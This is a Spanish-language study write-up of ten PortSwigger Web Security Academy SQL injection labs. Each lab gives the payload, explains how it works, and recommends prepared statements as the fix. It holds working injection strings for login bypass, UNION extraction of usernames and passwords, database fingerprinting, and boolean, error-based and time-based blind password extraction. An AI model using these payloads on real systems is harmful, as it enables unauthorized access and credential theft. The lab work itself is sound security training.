# SQL Injection Labs — PortSwigger Web Security Academy

Colección de laboratorios prácticos de SQL Injection completados en PortSwigger
Web Security Academy. Cada lab documenta la vulnerabilidad encontrada, el payload
usado, la lógica detrás del ataque y su impacto en un escenario real.

---

## Lab 1 — SQL Injection en WHERE clause

**Vulnerabilidad:** SQL Injection en parámetro `category`
**Objetivo:** recuperar productos ocultos (`released=0`)

### Consulta original del servidor
```sql
SELECT * FROM productos WHERE category='Gifts' AND released=1
```

### Payload usado
```
/filter?category=Gifts'+OR+1=1--+-
```

### Cómo funciona el payload
- `'` → cierra el string abierto por la app
- `OR 1=1` → condición siempre verdadera, devuelve todos los registros
- `--+-` → comenta el resto de la consulta, eliminando el filtro `released=1`

### Consulta resultante
```sql
SELECT * FROM productos WHERE category='Gifts' OR 1=1--
```

### Resultado
La app devolvió todos los productos incluyendo los marcados como no publicados.

### Impacto en escenario real
Un atacante puede acceder a productos, precios especiales, usuarios inactivos
o datos de otras empresas en sistemas multitenant que la aplicación oculta
intencionalmente.

### Remediación
Usar consultas parametrizadas (prepared statements) — nunca concatenar
el input del usuario directamente en el SQL.

---

## Lab 2 — Login Bypass via SQL Injection

**Vulnerabilidad:** SQL Injection en formulario de login
**Objetivo:** acceder como administrador sin conocer la contraseña

### Consulta original del servidor
```sql
SELECT * FROM usuarios WHERE username='input' AND password='input'
```

### Payload usado
- **Username:** `administrator'--`
- **Password:** cualquier valor

### Consulta resultante
```sql
SELECT * FROM usuarios WHERE username='administrator'--' AND password='...'
```

### Cómo funciona el payload
`'` cierra el string del username y `--` comenta el resto de la consulta,
eliminando completamente la validación de contraseña. El servidor solo
verifica que el usuario exista — no que la contraseña sea correcta.

### Resultado
Acceso completo a la cuenta de administrador sin conocer su contraseña.

### Impacto en escenario real
Acceso total a cuentas privilegiadas sin credenciales. Es uno de los
ataques más críticos posibles en una aplicación web — equivale a tener
las llaves de todo el sistema.

### Remediación
Prepared statements y nunca concatenar input del usuario directamente
en consultas SQL.

---

## Lab 3 — UNION Attack: Determinar Número de Columnas

**Vulnerabilidad:** SQL Injection via UNION
**Objetivo:** descubrir cuántas columnas devuelve la consulta original

### Técnica: ORDER BY incremental
```
/filter?category=Gifts'+ORDER+BY+1--+-   → sin error
/filter?category=Gifts'+ORDER+BY+2--+-   → sin error
/filter?category=Gifts'+ORDER+BY+3--+-   → sin error
/filter?category=Gifts'+ORDER+BY+4--+-   → error
```

### Cómo funciona
`ORDER BY N` falla cuando N supera el número de columnas reales,
revelando la cantidad exacta mediante el error de la aplicación.

### Resultado
La consulta original devuelve **3 columnas**.

### Impacto en escenario real
Conocer el número de columnas es el primer paso obligatorio de un
ataque UNION — sin este dato no es posible construir la consulta
maliciosa correctamente.

### Remediación
Prepared statements + manejo genérico de errores que no revele
información de la estructura de la base de datos.

---

## Lab 4 — UNION Attack: Encontrar Columna con Texto

**Vulnerabilidad:** SQL Injection via UNION
**Objetivo:** identificar qué columnas aceptan datos de tipo texto

### Técnica: reemplazar NULL por texto en cada posición
```sql
'+UNION+SELECT+'a',NULL,NULL--+-   → error (columna 1 no acepta texto)
'+UNION+SELECT+NULL,'a',NULL--+-   → sin error (columna 2 acepta texto)
```

### Cómo funciona
`NULL` es compatible con cualquier tipo de dato. Al reemplazar uno
por uno con una cadena de texto `'a'`, un error de tipo indica
incompatibilidad. Sin error indica que esa columna acepta texto.

### Resultado
Solo la **segunda columna** acepta datos de tipo texto.

### Impacto en escenario real
Las columnas de texto son las que permiten extraer datos legibles
como usernames, contraseñas y otra información sensible.

### Remediación
Prepared statements.

---

## Lab 5 — UNION Attack: Recuperar Datos de Otras Tablas

**Vulnerabilidad:** SQL Injection via UNION
**Objetivo:** extraer usernames y passwords de la tabla `users`

### Payload usado
```sql
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

### Consulta resultante
```sql
SELECT col1, col2, col3 FROM productos WHERE category=''
UNION SELECT NULL, username||'~'||password, NULL FROM users--
```

### Cómo funciona
`UNION` combina los resultados de dos consultas en una sola respuesta.
La segunda consulta apunta a una tabla completamente diferente (`users`).
`||` concatena username y password con `~` como separador para
mostrar ambos valores en la única columna de texto disponible.

### Resultado
La página mostró todas las credenciales de la tabla users:
```
administrator~<contraseña>
carlos~<contraseña>
```

### Impacto en escenario real
Extracción completa de credenciales de todos los usuarios de la
aplicación en un solo request.

### Remediación
Prepared statements.

---

## Lab 6 — UNION Attack: Múltiples Valores en una Columna

**Vulnerabilidad:** SQL Injection via UNION
**Objetivo:** extraer múltiples datos usando una sola columna de texto

### Payload usado
```sql
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

### Cómo funciona
Cuando solo hay una columna de texto disponible, se usa concatenación
(`||`) para combinar múltiples valores en un solo campo usando un
separador reconocible (`~`). Permite extraer varios datos
aunque el canal sea limitado.

### Impacto en escenario real
Técnica esencial cuando las condiciones de la inyección son
restrictivas — maximiza la extracción de datos con el canal disponible.

### Remediación
Prepared statements.

---

## Lab 7 — Fingerprinting: Versión de Base de Datos

**Vulnerabilidad:** SQL Injection para identificar el motor de base de datos
**Objetivo:** determinar qué base de datos usa la aplicación

### Payloads por motor de base de datos

| Motor | Payload |
|---|---|
| Oracle | `'+UNION+SELECT+NULL,banner+FROM+v$version--` |
| MySQL / SQL Server | `'+UNION+SELECT+NULL,@@version--` |
| PostgreSQL | `'+UNION+SELECT+NULL,version()--` |

### Cómo funciona
Cada motor de base de datos expone su versión en tablas o variables
internas diferentes. Identificar el motor es el primer paso de cualquier
ataque SQLi avanzado porque la sintaxis varía significativamente
entre Oracle, PostgreSQL, MySQL y SQL Server.

### Impacto en escenario real
Information disclosure que permite seleccionar exploits y payloads
específicos para la versión exacta del motor encontrado.

### Remediación
Prepared statements + nunca exponer errores de base de datos al usuario.

---

## Lab 8 — Blind SQLi con Respuestas Condicionales

**Vulnerabilidad:** Blind SQL Injection via cambio de contenido
**Base de datos:** PostgreSQL
**Objetivo:** extraer contraseña del administrator carácter por carácter

### Canal de comunicación
Presencia o ausencia de **"Welcome back"** en la respuesta.

### Payload base
```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1)
FROM users WHERE username='administrator')='a
```

### Cómo funciona
- Condición verdadera → consulta devuelve resultado → aparece "Welcome back"
- Condición falsa → consulta no devuelve nada → desaparece "Welcome back"

El script itera sobre las 20 posiciones de la contraseña y los
36 caracteres posibles (a-z, 0-9) detectando "Welcome back"
en `response.text`.

### Automatización
**Script:** `blind_sqli.py`
**Total de requests:** 720 (20 posiciones × 36 caracteres)

### Impacto en escenario real
Extracción completa de contraseñas sin ningún dato visible en pantalla.
Funciona aunque la app parezca no revelar información.

### Remediación
Prepared statements + no revelar diferencias de comportamiento
según resultados de la base de datos.

---

## Lab 9 — Blind SQLi con Errores Condicionales

**Vulnerabilidad:** Blind SQL Injection via errores HTTP
**Base de datos:** Oracle
**Objetivo:** extraer contraseña del administrator via errores 500

### Canal de comunicación
Código HTTP **500** (error) vs **200** (respuesta normal).

### Payload base
```sql
TrackingId=xyz'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a')
THEN TO_CHAR(1/0) ELSE '' END
FROM users WHERE username='administrator')||'
```

### Cómo funciona
- Condición verdadera → `TO_CHAR(1/0)` → división entre cero → **error 500**
- Condición falsa → `''` → respuesta normal → **200**

`||` es el operador de concatenación en Oracle.
`FROM dual` se usa cuando no se consulta una tabla real.
`TO_CHAR(1/0)` fuerza una excepción matemática en Oracle.

### Automatización
**Script:** `blind_sqli_oracle.py`
**Señal de éxito:** `response.status_code == 500`

### Impacto en escenario real
Extracción completa de contraseñas usando solo códigos de
respuesta HTTP — funciona aunque la app muestre exactamente
el mismo contenido en todas las respuestas.

### Remediación
Prepared statements + manejo genérico de errores que no revele
diferencias de comportamiento + timeouts en consultas SQL.

---

## Lab 10 — Blind SQLi con Time Delays

**Vulnerabilidad:** Blind SQL Injection via tiempo de respuesta
**Base de datos:** PostgreSQL
**Objetivo:** extraer contraseña del administrator midiendo tiempo de respuesta

### Canal de comunicación
**Tiempo de respuesta** — más de 8 segundos indica condición verdadera.

### Payload de identificación del motor
```sql
TrackingId=xyz'||pg_sleep(10)--
```

### Payload de extracción
```sql
TrackingId=xyz';SELECT CASE WHEN (SUBSTRING(password,1,1)='a')
THEN pg_sleep(10) ELSE pg_sleep(0) END
FROM users WHERE username='administrator'--
```

### Cómo funciona
- Condición verdadera → `pg_sleep(10)` → app tarda 10 segundos
- Condición falsa → `pg_sleep(0)` → respuesta inmediata

El script mide `time.time()` antes y después de cada request.
Si la diferencia supera 8 segundos, el carácter es correcto.

### Automatización
**Script:** `blind_sqli_timedelay.py`
**Señal de éxito:** `tiempo > 8`

### Impacto en escenario real
El tipo más sigiloso de Blind SQLi — funciona aunque la app
no muestre absolutamente ninguna diferencia visible en contenido
ni en código HTTP. Es el más difícil de detectar por un WAF o SIEM.

### Remediación
Prepared statements + timeouts en consultas SQL + rate limiting
de requests por IP.

---

## Resumen — Tipos de SQL Injection

| Tipo | Canal | Señal de éxito | Dificultad detección |
|---|---|---|---|
| In-band (WHERE) | URL/formulario | Datos visibles en pantalla | Fácil |
| In-band (UNION) | URL/formulario | Datos de otras tablas visibles | Fácil |
| Blind condicional | Cookie/header | Texto aparece/desaparece | Media |
| Blind error | Cookie/header | Código HTTP 500 vs 200 | Media |
| Blind time delay | Cookie/header | Tiempo de respuesta >8s | Difícil |

## Scripts desarrollados

| Script | Técnica | Lenguaje |
|---|---|---|
| `blind_sqli.py` | Blind SQLi condicional (PostgreSQL) | Python |
| `blind_sqli_oracle.py` | Blind SQLi errores (Oracle) | Python |
| `blind_sqli_timedelay.py` | Blind SQLi time delay (PostgreSQL) | Python |
